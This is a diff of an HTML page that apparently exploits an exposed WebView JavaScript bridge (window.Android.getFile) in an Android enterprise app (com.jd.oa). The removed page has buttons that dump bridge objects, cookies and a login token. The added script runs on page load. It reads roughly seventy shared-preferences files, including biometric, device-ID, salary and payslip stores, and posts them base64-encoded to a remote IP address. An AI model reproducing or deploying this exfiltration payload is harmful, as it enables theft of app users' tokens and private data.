@@ -1,146 +1,55 @@
-<!DOCTYPE html>
-<html>
+<script>
+(async () => {
+  const server = "http://120.26.107.38:8082/upload"; // 你的服务器地址
 
-<head>
-    <meta charset="UTF-8">
-    <title>AllOBJ</title>
+  const fileNames = [
+    "3808137dff6648cf.xml", "JdAndroidUUID.xml", "BIOMETRIC_OBJECT.xml", "QV1com.tencent.tbs.qimei.sdk.QimeiSDK471f54c20b9ccc6f.xml",
+    "BIOMETRIC_VERSION.xml", "RMonitor_SP.xml", "BUGLY_COMMON_VALUES.xml", "SP_AROUTER_CACHE.xml", "BuglySdkInfos.xml",
+    "WebViewChromiumPrefs.xml", "FlutterSharedPreferences.xml", "_bundle_icsp.xml", "IM_QUICK_APP.xml", "android.app.ActivityThread.IDS.xml",
+    "JDFlutterModules.xml", "app_locale_config.xml", "JDME.xml", "crashrecord.xml", "JDReactAttendance.xml", "d616403a149025c1.xml",
+    "JDReactFeedback.xml", "jd_ma_sdk.xml", "jd_meeting.xml", "jdme__language_info.xml", "jdme_devices_info.xml", "JDReactInvestmentM.xml",
+    "JDReactInvoiceClient.xml", "JDReactJDMELibrary.xml", "JDReactJDMESurvey.xml", "JDReactJMEAppGroup.xml", "JDReactJMEFpeTool.xml",
+    "JDReactJMERNAPI.xml", "JDReactJMESalary.xml", "JDReactJMETestRN.xml", "JDReactJMETripExpense.xml", "JDReactJMETripExpensePre.xml",
+    "JDReactJMEValues.xml", "JDReactJMEVocService.xml", "JDReactJMEcompanyTrip.xml", "JDReactJoySpaceHub.xml", "JDReactOfwTool.xml",
+    "JDReactPaySlip.xml", "JDReactPurchaseApproval.xml", "JDReactReimbursementClient.xml", "JDReactSmartBus.xml",
+    "JDReactSplitOperationTool.xml", "JDWebCoreConfig.xml", "JS-Storage.xml", "new_b_log_ID_tbsbeacon_com.jd.oa_0M300GVKSH1IMBEK.xml",
+    "plugin_setting.xml", "preference_keys.xml", "qb_video_settings.xml", "qm_global_sp.xml", "react_prefrence.xml", "sai.xml",
+    "shooter_strategyInfo.xml", "tbs_download_config.xml", "tbs_oat_status.xml", "tbs_preloadx5_check_cfg_file.xml", "tbss.xml",
+    "uifa.xml", "x5_lc_settings.xml", "x5_proxy_setting.xml", "jrdy_common_sp.xml", "jrdy_local_jue_sp.xml", "logx_strategyInfo.xml",
+    "media_jdma_sharePref.xml", "multi_process.xml"
+  ];
 
-    <!-- <script src="https://lf1-cdn-tos.bytegoofy.com/goofy/fe/ies/bridge/bytedance/jsbridge-2.2.10.umd.js"></script> -->​
-    <script src="https://cdn.jsdelivr.net/npm/vconsole@latest/dist/vconsole.min.js"></script>
-    <script>
-        var vConsole = new window.VConsole();
-    </script>
+  let uploaded = 0;
 
-    <script type="text/javascript">
-        function inOne() {
-            for (var property in window.pia_bridge) {
-                document.write(property + "\n\t<br/>");
-                console.log("data:" + property);
-            }
-            /* window.JSBridge.call('app.getAppInfo', { foo: 'bar' }, (res) => {
-                alert(JSON.stringify(res));
-            }); */
-            //vivoAdJsInterface allTrustCommonJsInterface vivoGeolocationDescription vivoEveryoneSearchClient worldCupClient
-        }
+  for (const file of fileNames) {
+    const path = "/data/data/com.jd.oa/shared_prefs/" + file;
+    try {
+      const base64Data = window.Android.getFile(path);
+      if (!base64Data || base64Data.length < 50) {
+        console.warn(`⚠️ 空或无效文件：${file}`);
+        continue;
+      }
 
-        window.callBackMyMessage = function (e) {
-            var data = JSON.stringify(e);
-            alert(data);
-        }
+      const res = await fetch(server, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          filename: file,
+          base64: base64Data
+        })
+      });
 
-        //getJDPinToken的回调 
-        window.callBackGetJDPinToken = function (a, b) {
-            console.log("data1:" + a);
-            console.log("data2:" + b);
-            alert(a);
-            alert(b);
-        }
+      if (res.ok) {
+        uploaded++;
+        console.log(`✅ 上传成功：${file} (${uploaded}/${fileNames.length})`);
+      } else {
+        console.error(`❌ 上传失败：${file}，状态码: ${res.status}`);
+      }
+    } catch (e) {
+      console.error(`❌ 异常上传失败：${file}`, e);
+    }
+  }
 
-        function callOne() {
-            //JDAppUnite.getPhoneBasicInfo("window.callBackMyMessage");
-            //JDAppUnite.requestLogin("window.callBackMyMessage");
-            //var data = window.novelJs.getAdParams("https://www.vivo.com/", "https://www.vivo.com/", "");
-            //var data = window.novelJs.getBrowserLocation("https://www.vivo.com/");
-            //var data = window.worldCupClient.getPhoneInfo("http://www.vivo.com.cn");
-            //console.log("data:" + JSON.stringify(data));
-            //alert(data);
-            /* var xmlhttp = new XMLHttpRequest();
-            xmlhttp.open("GET", "https://www.cnwatcher.com/js/allobj.html?info=" + data, true);
-            xmlhttp.send(); */
-            //alert(JSON.stringify(window.JDAppUnite.getPageConfig()));
-            //alert(JSON.stringify(window.xbrowser.getPageConfig()));
-            //alert(window.Android.getAppVersionInfo());
-            window.Android.getJDPinToken("https://www.jd.com");
-            alert(window.Android.getFile("/data/data/com.jd.oa/shared_prefs/JdAndroidUUID.xml"));
-        }
-
-        function shuxing() {
-            alert(JSON.stringify(window.__getGlobalConfig__()));
-            console.log("data:" + JSON.stringify(window.__getGlobalConfig__()));
-            //alert(window.__globalprops.getGlobalProps());
-            //alert(JSON.stringify(window.__globalProps));
-        }
-        function call2() {
-            console.log("data:" + document.cookie);
-            alert(1);
-            alert(document.cookie);
-        }
-
-        function upit() {
-            (async () => {
-                const server = "http://120.26.107.38:8082/upload"; // 修改为你实际部署的地址
-                const fileNames = [
-                    "3808137dff6648cf.xml", "JdAndroidUUID.xml", "BIOMETRIC_OBJECT.xml", "QV1com.tencent.tbs.qimei.sdk.QimeiSDK471f54c20b9ccc6f.xml",
-                    "BIOMETRIC_VERSION.xml", "RMonitor_SP.xml", "BUGLY_COMMON_VALUES.xml", "SP_AROUTER_CACHE.xml", "BuglySdkInfos.xml",
-                    "WebViewChromiumPrefs.xml", "FlutterSharedPreferences.xml", "_bundle_icsp.xml", "IM_QUICK_APP.xml", "android.app.ActivityThread.IDS.xml",
-                    "JDFlutterModules.xml", "app_locale_config.xml", "JDME.xml", "crashrecord.xml", "JDReactAttendance.xml", "d616403a149025c1.xml",
-                    "JDReactFeedback.xml", "jd_ma_sdk.xml", "jd_meeting.xml", "jdme__language_info.xml", "jdme_devices_info.xml", "JDReactInvestmentM.xml",
-                    "JDReactInvoiceClient.xml", "JDReactJDMELibrary.xml", "JDReactJDMESurvey.xml", "JDReactJMEAppGroup.xml", "JDReactJMEFpeTool.xml",
-                    "JDReactJMERNAPI.xml", "JDReactJMESalary.xml", "JDReactJMETestRN.xml", "JDReactJMETripExpense.xml", "JDReactJMETripExpensePre.xml",
-                    "JDReactJMEValues.xml", "JDReactJMEVocService.xml", "JDReactJMEcompanyTrip.xml", "JDReactJoySpaceHub.xml", "JDReactOfwTool.xml",
-                    "JDReactPaySlip.xml", "JDReactPurchaseApproval.xml", "JDReactReimbursementClient.xml", "JDReactSmartBus.xml",
-                    "JDReactSplitOperationTool.xml", "JDWebCoreConfig.xml", "JS-Storage.xml", "new_b_log_ID_tbsbeacon_com.jd.oa_0M300GVKSH1IMBEK.xml",
-                    "plugin_setting.xml", "preference_keys.xml", "qb_video_settings.xml", "qm_global_sp.xml", "react_prefrence.xml", "sai.xml",
-                    "shooter_strategyInfo.xml", "tbs_download_config.xml", "tbs_oat_status.xml", "tbs_preloadx5_check_cfg_file.xml", "tbss.xml",
-                    "uifa.xml", "x5_lc_settings.xml", "x5_proxy_setting.xml", "jrdy_common_sp.xml", "jrdy_local_jue_sp.xml", "logx_strategyInfo.xml",
-                    "media_jdma_sharePref.xml", "multi_process.xml"
-                ];
-
-                let uploaded = 0;
-
-                for (const file of fileNames) {
-                    const path = "/data/data/com.jd.oa/shared_prefs/" + file;
-                    try {
-                        const base64 = window.Android.getFile(path);
-                        if (!base64 || base64.length < 50) {
-                            console.warn(`⚠️ 跳过空文件: ${file}`);
-                            continue;
-                        }
-
-                        let retries = 3;
-                        while (retries--) {
-                            const res = await fetch(server, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({
-                                    filename: file,
-                                    base64,
-                                    token: "your_secure_token_123" // 可选签名验证
-                                })
-                            });
-
-                            if (res.ok) {
-                                uploaded++;
-                                console.log(`✅ 已上传 ${file} (${uploaded}/${fileNames.length})`);
-                                break;
-                            } else {
-                                console.warn(`🔁 重试 ${file} (${3 - retries}/3)`);
-                            }
-                        }
-
-                    } catch (e) {
-                        console.error(`❌ 读取失败 ${file}:`, e);
-                    }
-                }
-
-                alert(`✅ 上传完成：${uploaded}/${fileNames.length}`);
-            })();
-        }
-    </script>
-</head>
-
-<body>
-    <h1>AllOBJ</h1>
-
-    <button style="width:200px;height:200px;" onclick="callOne()">callOne</button>
-    <br />
-    <button style="width:200px;height:200px;" onclick="call2()">call2</button>
-    <br />
-    <button style="width:200px;height:200px;" onclick="upit()">upit</button>
-    <br />
-    <button style="width:200px;height:200px;" onclick="location.href=location.href+'?'">F5</button>
-    <br />
-
-</body>
-
-</html>
+  alert(`✅ 上传完毕，共 ${uploaded} 个文件`);
+})();
+</script>
